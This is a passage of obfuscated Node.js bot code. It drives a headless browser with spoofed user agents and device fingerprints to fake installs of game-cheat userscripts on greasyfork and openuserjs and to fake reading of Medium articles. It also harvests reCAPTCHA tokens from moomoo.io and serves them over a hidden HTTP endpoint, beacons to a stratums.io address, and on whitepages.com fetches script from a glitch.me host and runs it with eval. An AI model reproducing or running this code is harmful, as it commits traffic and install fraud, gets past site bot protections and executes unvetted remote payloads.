      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + Z(0x25, 'EG2@'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a0(0x17) + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + a0(0x6) + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + a0(0xe) + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + a0(0x18) + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1069 * -0x1 + 0x1e61 + -0x2eca
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0xa52 + -0x1 * 0x2353 + 0x921 * 0x5)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x1d66 + 0x510 + 0x18ba), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1513 + 0x16 + 0x1561), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x4 * 0x4a2 + -0x5be + -0xcca;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0xc24 + 0xe27 + -0x203; w < getRandomInt(-0x24d0 + -0x9d * 0x19 + -0x10b * -0x32, -0x6a9 + -0x3af + 0xa5d); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x34 * -0x429 + 0x1cb4f + -0x89b);
        }
      }();
    }, -0x42 * -0x92 + -0x1f * -0x25 + 0x1 * -0x29bb), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x2305 + -0x9e3 * -0x1 + -0x1674 * 0x2;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x81 * -0x14 + 0x16 * -0x105 + 0xc5a, -0x14f2 + 0xb12 + 0xa12 * 0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x6e * 0xd6 + 0x412 * 0x23 + 0x42ae);
    }, 0x2c * -0x26 + 0x507 + 0x1 * 0x1e5), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const a2 = b;
        try {
          let s = 0x5aa * -0x4 + 0x1 * 0x67 + 0x1641;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u[a2(0x21, 'gdYU')](), await t['close'](), r();
          await wait(0x91b + 0xaa8 + -0x1d * 0x47), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x1fd7 + -0x2c * 0x62 + 0x30af), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0xad658 + -0xecd06 + -0x3 * -0xd1faa);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x2481 + 0x1878 + -0x3c95);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x2579 + -0x5 * 0x3e + -0x1f * 0x125);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1ead + -0x1 * 0x29ae + 0x2a91);
}
doFlags['doOUJS'] && ((async () => {
  const bo = {
      f: 0x9
    },
    a9 = c,
    a8 = d,
    a7 = b;
  async function f() {
    const a6 = d,
      a5 = b,
      a4 = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x20c8 + -0x37b + 0x2444) {
        const a3 = b;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + a3(0x7, 'a%Qa')['length'] + (0x35 * 0x53 + -0x98 + -0x1096));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x8 * 0x1c9 + -0x10fb * -0x1 + -0x1f43, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1 * 0x1de0 + 0x24ae + -0x86 * 0xd, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x337 * 0x3 + -0xe79 + 0x2be4),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x7 * -0xe1 + -0x2f * -0x6a + 0xd73),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + a4(0xa) + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': a5(0x8, 'Ps2)'),
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': a6(0x26),
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      a7(0x10, 'HnJy') + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + a8(bo.f) + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
